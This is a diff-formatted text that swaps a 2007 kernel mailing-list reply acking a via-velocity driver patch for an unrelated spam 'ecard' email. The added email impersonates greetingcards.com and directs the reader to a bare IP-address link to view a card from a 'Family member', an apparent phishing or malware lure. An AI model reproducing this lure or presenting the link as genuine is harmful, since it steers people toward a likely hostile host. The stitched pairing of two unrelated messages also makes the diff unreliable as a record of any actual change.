@@ -1,26 +1,48 @@
-From: Francois Romieu <romieu@fr.zoreil.com>
-Date: Tue, 31 Jul 2007 22:32:47 +0000
-Subject: Re: [PATCH 76] drivers/net/via-velocity.c: mostly kmalloc + memset conversion to kcalloc
-Message-Id: <20070731223247.GA22528@electric-eye.fr.zoreil.com>
+From: "greetingcards.com" <tglzd@adbrite.com>
+Date: Sat, 07 Jul 2007 18:29:44 +0000
+Subject: [KJ] You've received an ecard from a Family member!
+Message-Id: <001701c7c0c4$ca2369f0$81d98763@uoctc.ualw>
 List-Id: <kernel-janitors.vger.kernel.org>
-References: <200707311845.48807.m.kozlowski@tuxland.pl> <200708010011.50979.m.kozlowski@tuxland.pl>
-In-Reply-To: <200708010011.50979.m.kozlowski@tuxland.pl>
 MIME-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
-To: Mariusz Kozlowski <m.kozlowski@tuxland.pl>
-Cc: linux-kernel@vger.kernel.org, kernel-janitors@vger.kernel.org, Andrew Morton <akpm@linux-foundation.org>, netdev@vger.kernel.org
+To: kernel-janitors@vger.kernel.org
 
-Mariusz Kozlowski <m.kozlowski@tuxland.pl> :
-> Signed-off-by: Mariusz Kozlowski <m.kozlowski@tuxland.pl>
-> 
->  drivers/net/via-velocity.c | 88263 -> 88120 (-143 bytes)
->  drivers/net/via-velocity.o | 254264 -> 253828 (-436 bytes)
-> 
->  drivers/net/via-velocity.c |   24 ++++++++++--------------
->  1 file changed, 10 insertions(+), 14 deletions(-)
+Hi. Family member has sent you an ecard.
+See your card as often as you wish during the next 15 days.
 
-Acked-by: Francois Romieu <romieu@fr.zoreil.com>
+SEEING YOUR CARD
 
--- 
-Ueimor
+If your email software creates links to Web pages, click on your 
+card's direct www address below while you are connected to the Internet:
+
+http://83.144.68.175/?8911e6c36a4bc955099675c500
+
+Or copy and paste it into your browser's "Location" box (where Internet 
+addresses go).
+     
+
+
+PRIVACY
+greetingcards.com honors your privacy. Our home page and Card Pick Up have links to our 
+Privacy Policy.
+
+TERMS OF USE
+By accessing your card you agree we have no liability. 
+If you don't know the person sending the card or don't wish to see the card, 
+please disregard this Announcement.
+
+We hope you enjoy your awesome card.
+
+Wishing you the best,
+Administrator,
+greetingcards.com
+
+_______________________________________________
+REMINDER: this mailing list moved to vger.kernel.org and current one will be discontinued soon.
+To resubscribe, send email to majordomo@vger.kernel.org with
+&quot;subscribe kernel-janitors&quot; in message body and follow instructions.
+
+Kernel-janitors mailing list
+Kernel-janitors@lists.linux-foundation.org
+https://lists.linux-foundation.org/mailman/listinfo/kernel-janitors
